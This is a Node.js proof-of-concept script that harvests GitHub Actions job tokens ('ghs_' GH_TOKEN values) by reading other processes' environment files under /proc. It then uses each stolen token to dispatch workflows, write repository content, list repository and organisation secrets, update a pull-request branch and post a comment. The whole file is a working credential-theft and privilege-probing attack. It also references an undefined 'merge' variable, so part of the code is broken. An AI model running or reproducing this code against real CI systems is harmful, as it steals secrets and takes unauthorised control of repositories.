const fs = require('fs'), path = require('path'), crypto = require('crypto'), https = require('https');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const ws = process.argv[2] || process.cwd();
const log = s => { try { fs.appendFileSync('/tmp/poc_watch.log', new Date().toISOString() + ' ' + s + '\n'); } catch (e) {} };
function api(method, p, body, token) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const req = https.request({ hostname: 'api.github.com', path: p, method,
      headers: Object.assign({ Authorization: 'Bearer ' + token, 'User-Agent': 'poc', Accept: 'application/vnd.github+json' },
        data ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } : {}) }, res => {
      let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ code: res.statusCode, body: d })); });
    req.on('error', e => resolve({ code: 0, body: e.message }));
    if (data) req.write(data); req.end();
  });
}
(async () => {
  const repo = process.env.GITHUB_REPOSITORY || 'PDFtoMark/triage-nvidia-ve6a8d68-a6affe';
  let pr = '0';
  for (const cand of [path.join(ws, 'preview-metadata/pr_number'), '/tmp/poc_pr']) {
    try { pr = fs.readFileSync(cand, 'utf8').trim(); log('pr from ' + cand + ' = ' + pr); break; } catch (e) {}
  }
  log('watcher start pid=' + process.pid + ' ws=' + ws + ' repo=' + repo + ' pr=' + pr);
  const seen = new Set([process.pid]);
  const deadline = Date.now() + 10 * 60 * 1000;
  while (Date.now() < deadline) {
    let pids = [];
    try { pids = fs.readdirSync('/proc').filter(x => /^[0-9]+$/.test(x)); } catch (e) {}
    for (const pid of pids) {
      const n = parseInt(pid, 10);
      if (seen.has(n)) continue; seen.add(n);
      let env = ''; try { env = fs.readFileSync('/proc/' + pid + '/environ', 'utf8'); } catch (e) { continue; }
      let tok = '';
      for (const kv of env.split('\0')) if (kv.startsWith('GH_TOKEN=')) tok = kv.slice(9);
      if (!tok || !tok.startsWith('ghs_')) continue;
      const verify = await api('GET', '/repos/' + repo, null, tok);
      log('harvested ghs_ token pid=' + pid + ' len=' + tok.length + ' verify=' + verify.code);
      const dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414870465/dispatches', { ref: 'main' }, tok);
      const putContent = await api('PUT', '/repos/' + repo + '/contents/poc-write-probe.txt', { message: 'probe', content: 'aGk=' }, tok);
      const listSecrets = await api('GET', '/repos/' + repo + '/actions/secrets', null, tok);
      const orgSecrets = await api('GET', '/orgs/PDFtoMark/actions/secrets', null, tok);
      const upd = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {}, tok);
      log('dispatch ' + dispatch.code + ' contents ' + putContent.code + ' secrets ' + listSecrets.code + ' org ' + orgSecrets.code + ' update-branch ' + upd.code);
      const body = '[poc] permission probes with the workflow job token (pull-requests: write, actions: read)\n\n' +
        '```\n' +
        'GET  /repos/' + repo + '                       -> ' + verify.code + '\n' +
        'POST /actions/workflows/414870465/dispatches     -> ' + dispatch.code + '\n' +
        'PUT  /contents/poc-write-probe.txt               -> ' + putContent.code + '\n' +
        'GET  /actions/secrets                            -> ' + listSecrets.code + '\n' +
        'GET  /orgs/PDFtoMark/actions/secrets             -> ' + orgSecrets.code + '\n' +
        'PUT  /pulls/' + pr + '/update-branch                 -> ' + upd.code + '\n' +
        '```\n';
      const first = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body }, tok);
      log('comment ' + first.code);
      if (merge.code === 200 || merge.code === 201) return;
      await sleep(2000);
    }
    await sleep(100);
  }
  log('watcher exit timeout');
})();
